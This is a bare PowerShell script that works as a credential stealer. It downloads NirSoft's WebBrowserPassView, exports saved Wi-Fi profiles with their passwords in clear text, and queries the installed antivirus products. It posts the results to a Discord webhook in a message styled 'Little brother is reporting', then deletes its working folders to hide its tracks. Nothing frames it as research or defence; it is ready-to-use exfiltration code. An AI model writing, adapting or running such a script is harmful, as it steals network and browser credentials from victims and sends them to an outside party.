$desktop = ([Environment]::GetFolderPath("Desktop"))
function Get-Nirsoft {

  mkdir \temp 
  cd \temp
  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip 
  .\7z\7za.exe e wbpv.zip

}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

[System.Collections.ArrayList]$embedArray = @()

$forEmbed =  [PSCustomObject]@{
    'title'       = 'Incoming transmission!'
    'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' 
    'color'       = '16744960'
    'fields'   = @(@{
    'name' = ""
    'value' = @($loggedwifis)
    })
}



$embedArray.Add($ForEmbed) | Out-Null

$Body = [PSCustomObject]@{

    embeds = $embedArray

}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json -Depth 4)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
}

function Wifi {
New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
$originalOutput = Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} 
$touchedOutput = $originalOutput.Replace("C:\Users\$env:username\AppData\Local\Temp\js2k3kd4nne5dhsk\Wi-Fi-", "")
$loggedwifis = $touchedOutput -replace "\.xml:.*?\:"
Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
Set-Location -Path "$env:temp"
Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse
}

 function Del-Nirsoft-File {
  cd C:\
  rmdir -R \temp
}

function version-av {
  mkdir \temp 
  cd \temp
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
  Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
  cd C:\
  rmdir -R \temp
}
